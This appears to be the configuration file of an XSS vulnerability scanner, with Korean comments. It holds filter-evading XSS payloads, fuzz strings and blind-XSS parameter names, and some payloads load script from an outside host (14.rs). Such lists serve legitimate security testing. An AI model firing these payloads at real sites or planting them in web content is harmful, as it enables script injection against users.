
changes = 'Negligible DOM XSS false positives;x10 faster crawling'
globalVariables = {}  # 런타임 동안 협력을 위해 모듈 간에 변수를 보유
defaultEditor = 'nano'
blindPayload = ''  # Blind XSS 페이로드
xsschecker = 'v3dm0s'  # 반사 및 기타 요소에 대한 확인을 위한 악성이 아닌 문자열

    # 프록시 추가에 대한 자세한 정보: http://docs.python-requests.org/en/master/user/advanced/#proxies
proxies = {'http': 'http://0.0.0.0:8080', 'https': 'http://0.0.0.0:8080'}

minEfficiency = 90  # 이 효율 미만의 페이로드는 표시되지 않음

delay = 0  # HTTP 요청 간의 기본 지연
threadCount = 10  # 기본 스레드 수
timeout = 10  # 기본 HTTP 요청 타임아웃

    # 특별한 속성을 가진 태그
specialAttributes = ['srcdoc', 'src']
badTags = ('iframe', 'title', 'textarea', 'noembed', 'style', 'template', 'noscript')
tags = ('html', 'd3v', 'a', 'details')  # HTML 태그

    # JS 함수 및 브레이커 사이에 사용할 "Things" 예: '};alert()//
jFillings = (';')
    # > 이전에 사용할 "Things" 예: <tag attr=value%0dx>
lFillings = ('', '%0dx')
  # 이벤트 핸들러와 = 또는 함수와 = 사이에 사용할 "Things" 예: %09, %0a, %0d, +
eFillings = ('%09', '%0a', '%0d', '+')
fillings = ('%09', '%0a', '%0d', '/+/')  # 공백 대신 사용할 "Things"

eventHandlers = {
        'ontoggle': ['details'],
        'onpointerenter': ['d3v', 'details', 'html', 'a'],
        'onmouseover': ['a', 'html', 'd3v']
    }

functions = (
        '[8].find(confirm)', 'confirm()',
        '(confirm)()', 'co\u006efir\u006d()',
        '(prompt)``', 'a=prompt,a()')

payloads = (
        '\'"</Script><Html Onmouseover=(confirm)()//'
        '<imG/sRc=l oNerrOr=(prompt)() x>',
        '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>',
        '<deTails open oNToggle=confi\u0072m()>',
        '<img sRc=l oNerrOr=(confirm)() x>',
        '<svg/x=">"/onload=confirm()//',
        '<svg%0Aonload=%09((pro\u006dpt))()//',
        '<iMg sRc=x:confirm`` oNlOad=e\u0076al(src)>',
        '<sCript x>confirm``</scRipt x>',
        '<Script x>prompt()</scRiPt x>',
        '<sCriPt sRc=//14.rs>',
        '<embed//sRc=//14.rs>',
        '<base href=//14.rs/><script src=/>',
        '<object//data=//14.rs>',
        '<s=" onclick=confirm``>clickme',
        '<svG oNLoad=co\u006efirm&#x28;1&#x29>',
        '\'"><y///oNMousEDown=((confirm))()>Click',
        '<a/href=javascript&colon;co\u006efirm&#40;&quot;1&quot;&#41;>clickme</a>',
        '<img src=x onerror=confir\u006d`1`>',
        '<svg/onload=co\u006efir\u006d`1`>')

fuzzes = (
        '<test', '<test//', '<test>', '<test x>', '<test x=y', '<test x=y//',
        '<test/oNxX=yYy//', '<test oNxX=yYy>', '<test onload=x', '<test/o%00nload=x',
        '<test sRc=xxx', '<test data=asa', '<test data=javascript:asa', '<svg x=y>',
        '<details x=y//', '<a href=x//', '<emBed x=y>', '<object x=y//', '<bGsOund sRc=x>',
        '<iSinDEx x=y//', '<aUdio x=y>', '<script x=y>', '<script//src=//', '">payload<br/attr="',
        '"-confirm``-"', '<test ONdBlcLicK=x>', '<test/oNcoNTeXtMenU=x>', '<test OndRAgOvEr=x>')

headers = {
        'User-Agent': '$',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip,deflate',
        'Connection': 'close',
        'DNT': '1',
        'Upgrade-Insecure-Requests': '1',
    }

blindParams = [
        'redirect', 'redir', 'url', 'link', 'goto', 'debug', '_debug', 'test', 'get', 'index', 'src', 'source', 'file',
        'frame', 'config', 'new', 'old' ]
